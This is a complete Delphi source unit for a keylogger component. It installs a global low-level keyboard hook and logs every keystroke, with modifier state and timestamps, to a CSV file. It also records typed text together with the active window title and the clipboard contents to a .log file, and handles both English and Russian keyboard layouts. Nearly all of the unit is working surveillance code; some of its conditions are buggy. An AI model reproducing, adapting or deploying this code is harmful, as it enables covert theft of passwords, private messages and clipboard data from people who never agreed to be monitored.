unit Keylogger;

interface
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls,Clipbrd,Data_Time;

  const
  WH_KEYBOARD_LL = 13;

type
  TKBDLLHOOKSTRUCT = packed record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: pointer;
  end;

  PKBDLLHOOKSTRUCT = ^TKBDLLHOOKSTRUCT;

type
  TTimerKey = class(TThread)
  private { Private declarations }
  protected
    procedure Execute; override;
  end;

type
  TKeyNode = class
    public
      Key_Event :String;
      Key_Code :String;
      Shift : Boolean;
      Alt : Boolean;
      Control : Boolean;
      Timestamp : Integer;

      constructor Create(const Key_Event :String; const Key_Code :String; const Shift : Boolean;
                          const Alt : Boolean; const Control : Boolean; const Timestamp : Integer);
  end;

type
  TKeylogger = class(TComponent)
 private
    FActive: Boolean;
    FFileName : String;
    procedure SetActive(const Value: Boolean);
    procedure SetFileName(const Name: string);
  protected
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
  published
    property Active: Boolean read FActive write SetActive;
    property FileName: String read FFileName write SetFileName;
  end;

 var
  kHook: cardinal;
  key, keydel, keymouse: Boolean;
  TextM: TMemo;
  TimerKey: TTimerKey;
  Buffer: string;
  FileNameLog: string;
  f: TextFile;

implementation

constructor TKeyNode.Create(const Key_Event :String; const Key_Code :String; const Shift : Boolean;
                          const Alt : Boolean; const Control : Boolean; const Timestamp : Integer);
begin
   self.Key_Event := Key_Event;
   self.Key_Code := Key_Code;
   self.Shift := Shift;
   self.Alt := Alt;
   self.Control := Control;
   self.Timestamp := Timestamp;
end;

constructor TKeylogger.Create(AOwner: TComponent);
begin
  inherited create(Aowner);
  Self.FFileName:='test';
  FileNameLog := Self.FileName;
end;

destructor TKeylogger.Destroy;
begin
  inherited;
end;

procedure KeySaveToFile(keytext: string);
var
  f: TextFile;
  buf: array[Byte] of Char;
begin
  if ((keytext <> #13) or (keytext <> ' ') or (keytext <> '  ') or (keytext <> '   ') or (keytext <> '    ')) then
  begin

    GetWindowText(GetForegroundWindow, buf, Length(buf) * SizeOf(buf[0]));
    AssignFile(f, ExtractFilePath(Application.ExeName) +  FileNameLog + '.log');
    if FileExists(ExtractFilePath(Application.ExeName) +  FileNameLog + '.log') = False then
    begin
      Rewrite(f);
      Writeln(f, '[' + TimeToStr(Time) + '] ' + keytext + ' [' + buf + ']');
      try
        if Buffer <> Clipboard.AsText then
        begin
          Buffer := Clipboard.AsText;
          Writeln(f, #13#10 + '[' + TimeToStr(Time) + ']' + #13#10 + '<clipboard>' + #13#10 + Buffer + #13#10 + '</clipboard>' + #13#10 + ' [' + buf + ']' + #13#10);
        end;
      except
      end;
      CloseFile(f);
    end
    else
    begin
      Append(f);
      Writeln(f, '[' + TimeToStr(Time) + '] ' + keytext + ' [' + buf + ']');
      try
        if Buffer <> Clipboard.AsText then
        begin
          Buffer := Clipboard.AsText;
          Writeln(f, #13#10 + '[' + TimeToStr(Time) + ']' + #13#10 + ' <clipboard>' + #13#10 + Buffer + #13#10 + '</clipboard>' + #13#10 + ' [' + buf + ']' + #13#10);
        end;
      except
      end;
      CloseFile(f);
    end;

  end;

end;

procedure TTimerKey.Execute;
begin

  while True do
  begin
    if TimerKey.Terminated then
    begin
      break;
    end;

    sleep(200);

    Application.ProcessMessages;
    if getasynckeystate(WH_KEYBOARD_LL) <> 0 then
    begin
      key := True;
      while key = True do
      begin
        Application.ProcessMessages;
        if getasynckeystate(WH_KEYBOARD_LL) = 0 then
        begin
          key := False;
          if TextM.Text <> '' then
          begin
            KeySaveToFile(TextM.Text);
          end;
          TextM.Text := '';
        end;
      end;
    end;

    if getasynckeystate(1) <> 0 then
    begin
      keymouse := True;
      while keymouse = True do
      begin
        Application.ProcessMessages;
        if getasynckeystate(1) = 0 then
        begin
          keymouse := False;
          if TextM.Text <> '' then
          begin
           KeySaveToFile(TextM.Text);
          end;
          TextM.Text := '';
        end;
      end;
    end;

  end;

end;


function GetChar(lparam: integer): Ansistring;
var
  data: PKBDLLHOOKSTRUCT;
  keystate: TKeyboardState;
  retcode: Integer;
  l: hkl;
begin
  data := pointer(lparam);
  GetKeyboardState(keystate);
  l := GetKeyBoardLayout(GetWindowThreadProcessId(GetForegroundWindow));
  SetLength(Result, 2);
  retcode := ToAsciiEx(data.vkCode, data.scanCode, keystate, @Result[1], 0, l);
  case retcode of
    0:
      Result := '';
    1:
      SetLength(Result, 1);
  else
    Result := '';
  end;
end;

function GetInfoChar(lparam: integer): Ansistring;
var
  data: PKBDLLHOOKSTRUCT;
  keystate: TKeyboardState;
  retcode: Integer;
  l: hkl;
begin
  data := pointer(lparam);
  GetKeyboardState(keystate);
  l := GetKeyBoardLayout(GetWindowThreadProcessId(GetForegroundWindow));
  SetLength(Result, 2);
  retcode := ToAsciiEx(data.vkCode, data.scanCode, keystate, @Result[1], 0, l);

  case retcode of
    0:
      Result := '';
    1:
      SetLength(Result, 1);
  else
    Result := '';
  end;

  if (data.vkCode = 160) then
    Result := 'LSHIFT';

  if (data.vkCode = 161) then
    Result := 'RSHIFT';
  if (data.vkCode = 13) then
    Result := 'ENTER';

  if (data.vkCode = 162) then
    Result := 'LCtrl';
  if (data.vkCode = 163) then
    Result := 'RCtrl';

  if (data.vkCode = 164) then
    Result := 'LAlt';
  if (data.vkCode = 165) then
    Result := 'RAlt';

  Result := PAnsiChar(Result)+ ';' +IntToStr(data.vkCode)+';'+IntToStr(keystate[16])+';'+IntToStr(keystate[18])
            +';'+IntToStr(keystate[17])+';'+ GetFullTime();
end;

function Get_Shift_Char(ch: AnsiString): AnsiString;
begin
  if GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow, nil)) = 67699721 then
  begin
//английская
    if(Length(ch)>0) then
    case ch[1] of
      '1':
        ch[1] := '!';
      '2':
        ch[1] := '@';
      '3':
        ch[1] := '#';
      '4':
        ch[1] := '$';
      '5':
        ch[1] := '%';
      '6':
        ch[1] := '^';
      '7':
        ch[1] := '&';
      '8':
        ch[1] := '*';
      '9':
        ch[1] := '(';
      '0':
        ch[1] := ')';
      '-':
        ch[1] := '_';
      '=':
        ch[1] := '+';
      '`':
        ch[1] := '~';

      'q':
        ch[1] := 'Q';
      'w':
        ch[1] := 'W';
      'e':
        ch[1] := 'E';
      'r':
        ch[1] := 'R';
      't':
        ch[1] := 'T';
      'y':
        ch[1] := 'Y';
      'u':
        ch[1] := 'U';
      'i':
        ch[1] := 'I';
      'o':
        ch[1] := 'O';
      'p':
        ch[1] := 'P';
      '[':
        ch[1] := '{';
      ']':
        ch[1] := '}';
      'a':
        ch[1] := 'A';
      's':
        ch[1] := 'S';
      'd':
        ch[1] := 'D';
      'f':
        ch[1] := 'F';
      'g':
        ch[1] := 'G';
      'h':
        ch[1] := 'H';
      'j':
        ch[1] := 'J';
      'k':
        ch[1] := 'K';
      'l':
        ch[1] := 'L';
      ';':
        ch[1] := ':';
      '''':
        ch[1] := '"';
      '\':
        ch[1] := '|';
      'z':
        ch[1] := 'Z';
      'x':
        ch[1] := 'X';
      'c':
        ch[1] := 'C';
      'v':
        ch[1] := 'V';
      'b':
        ch[1] := 'B';
      'n':
        ch[1] := 'N';
      'm':
        ch[1] := 'M';
      ',':
        ch[1] := '<';
      '.':
        ch[1] := '>';
      '/':
        ch[1] := '?';
    end;
    Result := ch;

  end
  else
  begin
//русская
    if(Length(ch)>0) then
    case ch[1] of
      '1':
        ch[1] := '!';
      '2':
        ch[1] := '"';
      '3':
        ch[1] := '№';
      '4':
        ch[1] := ';';
      '5':
        ch[1] := '%';
      '6':
        ch[1] := ':';
      '7':
        ch[1] := '?';
      '8':
        ch[1] := '*';
      '9':
        ch[1] := '(';
      '0':
        ch[1] := ')';
      '-':
        ch[1] := '_';
      '=':
        ch[1] := '+';
      'ё':
        ch[1] := 'Ё';

      'й':
        ch[1] := 'Й';
      'ц':
        ch[1] := 'Ц';
      'у':
        ch[1] := 'У';
      'к':
        ch[1] := 'К';
      'е':
        ch[1] := 'Е';
      'н':
        ch[1] := 'Н';
      'г':
        ch[1] := 'Г';
      'ш':
        ch[1] := 'Ш';
      'щ':
        ch[1] := 'Щ';
      'з':
        ch[1] := 'З';
      'х':
        ch[1] := 'Х';
      'ъ':
        ch[1] := 'Ъ';
      'ф':
        ch[1] := 'Ф';
      'ы':
        ch[1] := 'Ы';
      'в':
        ch[1] := 'В';
      'а':
        ch[1] := 'А';
      'п':
        ch[1] := 'П';
      'р':
        ch[1] := 'Р';
      'о':
        ch[1] := 'О';
      'л':
        ch[1] := 'Л';
      'д':
        ch[1] := 'Д';
      'ж':
        ch[1] := 'Ж';
      'э':
        ch[1] := 'Э';
      '\':
        ch[1] := '/';
      'я':
        ch[1] := 'Я';
      'ч':
        ch[1] := 'Ч';
      'с':
        ch[1] := 'С';
      'м':
        ch[1] := 'М';
      'и':
        ch[1] := 'И';
      'т':
        ch[1] := 'Т';
      'ь':
        ch[1] := 'Ь';
      'б':
        ch[1] := 'Б';
      'ю':
        ch[1] := 'Ю';
      '.':
        ch[1] := ',';
    end;
    Result := ch;

  end;

end;

function KbdProc(code: integer; wparam: integer; lparam: integer): Integer; stdcall;
var
  ss: string;
begin
  if (code < 0) or (code <> HC_ACTION) then
    result := 0
  else
  begin

    if (wParam = wm_keydown)  or (wParam = wm_keyup) then
    begin

      if PAnsiChar(lparam) <> ' ' then
      begin
        if ((getasynckeystate(16) <> 0) or (GetKeyState(VK_CAPITAL) = 1)) then
        //если shift зажат или caps lock горит
        begin
          TextM.Text := TextM.Text + string(PAnsiChar(Get_Shift_Char(GetChar(lparam))));
          if (wParam = wm_keydown) then
            Writeln(f, IntToStr(wm_keydown) +';'+ string(PAnsiChar(GetInfoChar(lparam))))
          else
            Writeln(f, IntToStr(wm_keyup) +';'+ string(PAnsiChar(GetInfoChar(lparam))));
        end
        else
        begin
          TextM.Text := TextM.Text + string(PAnsiChar(GetChar(lparam)));
          if (wParam = wm_keydown) then
            Writeln(f, IntToStr(wm_keydown) +';'+ string(PAnsiChar(GetInfoChar(lparam))))
          else
            Writeln(f, IntToStr(wm_keyup) +';'+ string(PAnsiChar(GetInfoChar(lparam))));
        end;
      end
      else
      begin
        ss := TextM.Text;
        Delete(ss, length(ss), 1);
        TextM.Text := ss;
      end;

    end;
   {
    if wParam = wm_keyup then
    begin

      if PAnsiChar(lparam) <> ' ' then
      begin
        if ((getasynckeystate(16) <> 0) or (GetKeyState(VK_CAPITAL) = 1)) then
        //если shift зажат или caps lock горит
        begin
          TextM.Text := TextM.Text + string(PAnsiChar(Get_Shift_Char(GetChar(lparam))));
          Writeln(f, IntToStr(wm_keyup) +';'+ string(PAnsiChar(GetInfoChar(lparam))));
        end
        else
        begin
          TextM.Text := TextM.Text + string(PAnsiChar(GetChar(lparam)));
          Writeln(f, IntToStr(wm_keyup) +';'+ string(PAnsiChar(GetInfoChar(lparam))));
        end;
      end
      else
      begin
        ss := TextM.Text;
        Delete(ss, length(ss), 1);
        TextM.Text := ss;
      end;

    end;
    }
    if wParam = wm_syskeydown then
    begin
      Application.ProcessMessages;
    end;

    Result := 0;
  end;
end;

procedure TKeylogger.SetActive(const Value: Boolean);
begin
  FActive := Value;
  if FActive = True then
  begin
    AssignFile(f, ExtractFilePath(Application.ExeName) +  FileNameLog + '.csv');
    if FileExists(ExtractFilePath(Application.ExeName) +  FileNameLog + '.csv') = False then
    begin
      Rewrite(f);
      WriteLn(f,'Event_Type;Char;Key_Code;Shift;Alt;Control;Timestamp');
    end
    else
      Append(f);

    TextM := TMemo.Create(Self);
    kHook := SetWindowsHookEx(WH_KEYBOARD_LL, @KbdProc, HInstance, 0);
    if kHook <> INVALID_HANDLE_VALUE then
    begin
      TimerKey := TTimerKey.Create(False);
      TimerKey.Priority := tpNormal;
    end;
  end
  else
  begin
    //Free(TextM);
     CloseFile(f);
    if kHook <> INVALID_HANDLE_VALUE then
    begin

      if TimerKey <> nil then
      begin
        TimerKey.Terminate;
        FreeAndNil(TimerKey);
      end;

      UnhookWindowsHookEx(kHook);

    end;
  end;

end;

procedure TKeylogger.SetFileName(const Name: string);
begin
  Self.FFileName := Name;
  FileNameLog := Name;
end;

end.
